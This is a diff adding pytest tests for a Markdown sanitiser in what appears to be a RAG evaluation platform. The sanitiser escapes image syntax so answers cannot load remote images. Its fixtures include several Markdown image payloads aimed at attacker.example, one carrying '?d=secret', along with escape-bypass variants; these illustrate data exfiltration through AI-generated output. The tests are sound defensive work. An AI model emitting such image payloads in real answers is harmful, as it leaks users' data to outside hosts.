@@ -1,5 +1,7 @@
 """Tests for playground.query_visuals (pure data behind the per-question charts)."""
 
+import re
+
 import pytest
 
 from rag_eval_platform.evaluation.citation_validity import CitationValidity, CitationVerdict
@@ -16,6 +18,7 @@ from rag_eval_platform.playground.query_visuals import (
     answer_spans,
     funnel_stages,
     hit_vs_faithfulness,
+    inert_markdown_images,
     origin,
     prompt_blocks,
     rerank_moves,
@@ -234,3 +237,48 @@ def test_spans_markdown_keeps_markdown_and_chips_but_disarms_html() -> None:
     assert "line-through" in rendered  # [9] is not a real source
     assert "<script>" not in rendered
     assert "&lt;script>x&lt;/script> &amp; > q" in rendered  # inert; ">" kept for quotes
+
+
+def has_loadable_image(text: str) -> bool:
+    """True if Markdown would render an image: a "![" whose "!" is preceded by an even
+    number of backslashes (each "\\\\" pair is a literal backslash, not an escape)."""
+    return any(len(m.group(1)) % 2 == 0 for m in re.finditer(r"(\\*)!\[", text))
+
+
+@pytest.mark.parametrize("image", [
+    "![pixel](https://attacker.example/t.png?d=secret)",
+    '![x](https://attacker.example/a.png "title")',
+    "![logo][ref]\n\n[ref]: https://attacker.example/r.png",
+    "![shortcut]\n\n[shortcut]: https://attacker.example/s.png",
+    "\\\\![x](https://attacker.example/even.png)",  # "\\" is a literal backslash
+    "\\\\\\\\![x](https://attacker.example/four.png)",
+])  # fmt: skip
+def test_inert_markdown_images_stops_images_from_loading(image: str) -> None:
+    safe = inert_markdown_images(f"Answer [1]. {image}")
+
+    assert not has_loadable_image(safe)  # nothing left that a renderer would fetch
+    assert "\\![" in safe  # escaped: the text still shows, as a plain link at most
+
+
+def test_inert_markdown_images_leaves_normal_markdown_alone() -> None:
+    text = "## Title\n\n- **bold** item [1]\n- [a link](https://example.com)!"
+
+    assert inert_markdown_images(text) == text
+
+
+def test_spans_markdown_never_emits_a_loadable_image() -> None:
+    rendered = spans_markdown(
+        text_spans("See ![p](https://attacker.example/p.png) and [1].", sources=1)
+    )
+
+    assert not has_loadable_image(rendered)
+
+
+def test_has_loadable_image_counts_backslashes() -> None:
+    assert has_loadable_image("![a](u)")
+    assert not has_loadable_image("\\![a](u)")  # escaped "!"
+    assert has_loadable_image("\\\\![a](u)")  # literal backslash, then a real image
+
+
+def test_inert_markdown_images_keeps_an_already_escaped_image_escaped() -> None:
+    assert inert_markdown_images("\\![a](u)") == "\\![a](u)"
